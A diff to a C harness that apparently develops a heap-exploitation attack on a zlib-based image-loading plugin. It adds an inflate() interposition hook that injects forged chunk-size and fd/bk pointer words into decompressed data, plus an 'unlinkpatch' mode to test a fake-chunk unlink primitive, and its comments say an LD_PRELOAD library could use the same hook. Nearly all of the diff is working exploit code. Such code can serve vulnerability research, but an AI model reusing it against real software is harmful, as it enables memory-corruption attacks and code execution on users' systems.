@@ -20,6 +20,7 @@
 #include <string.h>
 #include <malloc.h>
 #include <zlib.h>
+#include <dlfcn.h>
 
 typedef void GimpImage;
 #define _(s) (s)
@@ -62,6 +63,42 @@ static void *consume_B = NULL;
  * fake chunk starts 16 bytes before this buffer, so fake->fd is the
  * first word of fake_buf. */
 static unsigned char fake_buf[64] __attribute__((aligned (16)));
+
+/* Simulated preload shim: interpose the pin's single inflate() call and,
+ * only in `unlinkpatch` mode, write live pointer words into the already
+ * decompressed bytes. No pinned source is changed. This tests whether the
+ * W294 fake-chunk primitive survives a shim patch made *after* real zlib
+ * has written the file-chosen payload — the missing primitive for a live
+ * plugin preload shim. An LD_PRELOAD library would use the same hook. */
+static int (*real_inflate_fn) (z_streamp, int) = NULL;
+static int patch_armed = 0;
+static int patch_hits = 0;
+static void *patch_fd = NULL;
+static void *patch_bk = NULL;
+
+int
+inflate (z_streamp strm, int flush)
+{
+  unsigned char *out = strm ? strm->next_out : NULL;
+  if (! real_inflate_fn)
+    real_inflate_fn = (int (*) (z_streamp, int)) dlsym (RTLD_NEXT, "inflate");
+  if (! real_inflate_fn)
+    {
+      fprintf (stderr, "dlsym(RTLD_NEXT,inflate) failed\n");
+      exit (2);
+    }
+  int rc = real_inflate_fn (strm, flush);
+  if (patch_armed && out && strm->total_out >= 324)
+    {
+      size_t sz = 0x111;
+      memcpy (out + 264, &sz, sizeof sz);
+      memcpy (out + 272, &patch_fd, sizeof patch_fd);
+      memcpy (out + 280, &patch_bk, sizeof patch_bk);
+      patch_armed = 0;
+      patch_hits++;
+    }
+  return rc;
+}
 
 
 /* Build a JIF-style chunk stream whose zlib payload inflates to `outlen`
@@ -165,9 +202,11 @@ main (int argc, char **argv)
   setvbuf (stdout, NULL, _IONBF, 0);
   const char *mode = (argc > 1) ? argv[1] : "attack";
   int consume_mode = (! strcmp (mode, "consume") || ! strcmp (mode, "consumesz") ||
-                      ! strcmp (mode, "consume-safe") || ! strcmp (mode, "unlink"));
+                      ! strcmp (mode, "consume-safe") || ! strcmp (mode, "unlink") ||
+                      ! strcmp (mode, "unlinkpatch"));
   int consume_safe = ! strcmp (mode, "consume-safe");
-  int unlink_mode = ! strcmp (mode, "unlink");
+  int unlink_mode = (! strcmp (mode, "unlink") || ! strcmp (mode, "unlinkpatch"));
+  int patch_mode = ! strcmp (mode, "unlinkpatch");
 
   int caller_mode = (! strcmp (mode, "caller") || ! strcmp (mode, "callerpub"));
   int file_mode = (! strcmp (mode, "file") || ! strcmp (mode, "fileptr") ||
@@ -327,9 +366,19 @@ main (int argc, char **argv)
 
           memcpy (fake_before, fake_buf, sizeof fake_before);
           memset (payload, payload_byte, sizeof payload);
-          memcpy (payload + 264, &sz, sizeof sz);
-          memcpy (payload + 272, &unsorted, sizeof unsorted);
-          memcpy (payload + 280, &fakechunk, sizeof fakechunk);
+          if (patch_mode)
+            {
+              patch_fd = unsorted;
+              patch_bk = fakechunk;
+              patch_armed = 1;
+              printf ("PATCH_ARMED=1 fd=%p bk=%p\n", patch_fd, patch_bk);
+            }
+          else
+            {
+              memcpy (payload + 264, &sz, sizeof sz);
+              memcpy (payload + 272, &unsorted, sizeof unsorted);
+              memcpy (payload + 280, &fakechunk, sizeof fakechunk);
+            }
           payload_custom = 1;
           printf ("UNLINK_SETUP fake=%p fd_slot=%p bk_slot=%p "
                   "unsorted=%p bin=%p victim_user=%p victim_chunk=%p\n",
@@ -351,6 +400,9 @@ main (int argc, char **argv)
               *(size_t *) ((char *) consume_B + 264),
               *(size_t *) ((char *) consume_B + 272),
               *(size_t *) ((char *) consume_B + 280));
+
+      if (patch_mode)
+        printf ("PATCH_HITS=%d\n", patch_hits);
 
       for (int k = 0; k < 10; k++)
         {
